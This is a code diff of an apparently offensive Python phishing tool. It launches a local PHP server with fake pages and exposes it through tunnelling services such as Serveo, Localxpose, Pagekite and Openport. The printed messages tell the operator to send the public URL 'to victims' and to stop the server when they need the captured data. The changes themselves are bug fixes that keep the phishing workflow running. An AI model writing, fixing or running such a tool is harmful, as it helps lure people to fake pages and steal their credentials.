@@ -261,7 +261,7 @@ def runPagekite(port):
 			print("\n{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
 			print("\n{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
 			print("\n{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
-			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.{1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
 			input("\n\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
 			system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
 			system("cd Server/www/ && php -S localhost:%s > /dev/null 2>&1 &" % (port))
@@ -283,7 +283,7 @@ def runOpenport(port):
 		print('[*] Openport not Installed correctly, Try installing it manually !!')
 		print('[*] Check Here ... https://openport.io/download')
 		input('\n Press Enter To Go back..')
-		selectServer()
+		selectServer(port)
 	else:
 		manageOpenporturl(port)
 
@@ -436,7 +436,7 @@ def customLocalxpose(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = str(output).decode("utf-8")
+        url = output.decode("utf-8")
         system('clear')
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -469,7 +469,7 @@ def randomLocalxpose(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = str(output.decode('utf-8'))
+        url = output.decode('utf-8')
         print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
             MAIN0, MAIN4, MAIN3, port, url) + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
@@ -519,7 +519,7 @@ def customServeo(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-        url = str(output).decode("utf-8")
+        url = output.decode("utf-8")
         system('clear')
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -552,7 +552,7 @@ def randomServeo(port):
     try:
         output = check_output(
             "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-        url = str(output).decode("utf-8")
+        url = output.decode("utf-8")
         print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
             MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
